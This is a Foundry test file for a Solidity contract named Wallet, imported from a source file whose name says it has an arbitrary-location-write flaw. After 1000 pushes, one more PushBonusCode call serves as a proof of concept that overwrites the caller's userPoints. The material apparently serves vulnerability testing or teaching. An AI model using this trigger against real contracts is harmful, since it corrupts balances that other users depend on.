// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/arbitrary_location_write_simple.sol";

contract TestWallet is Test {
    Wallet wallet;
    uint256 constant MAX = 1000;

    function setUp() public {
        wallet = new Wallet();
    }

    function test_PushBeyondCapacity() public {
        // Push to fill array to maximum
        for (uint256 i = 0; i < MAX; i++) {
            wallet.PushBonusCode(1);
        }

        // BEFORE: Record state after MAX (1000) pushes
        console2.log("--- BEFORE-Trigger Push ---");
        uint256 beforePoints = wallet.userPoints(address(this));
        console2.log("userPoints[address(this)] (before):", beforePoints);
        
        // CRITICAL ACTION: Push beyond maximum capacity
        console2.log("\n--- Trigger: PushBonusCode(1) (1001th push) ---");
        wallet.PushBonusCode(1);

        // AFTER: Record state after critical action
        console2.log("\n--- AFTER-Trigger Push ---");
        uint256 afterPoints = wallet.userPoints(address(this));
        console2.log("userPoints[address(this)] (after):", afterPoints);

        // Differential comparison
        console2.log("\n--- DIFFERENTIAL VERDICT ---");
        bool pointsMaliciouslyModified = (afterPoints == 1); 
        
        if (pointsMaliciouslyModified) {
            console2.log("VULNERABILITY CONFIRMED: User points overwritten to 1 (arbitrary write)");
            console2.log("Vulnerability Exists: Arbitrary write");
        } else {
            console2.log("BEHAVIOR EXPECTED: Points not reset");
            console2.log("Vulnerability not Exist: No state corruption");
        }
    }
}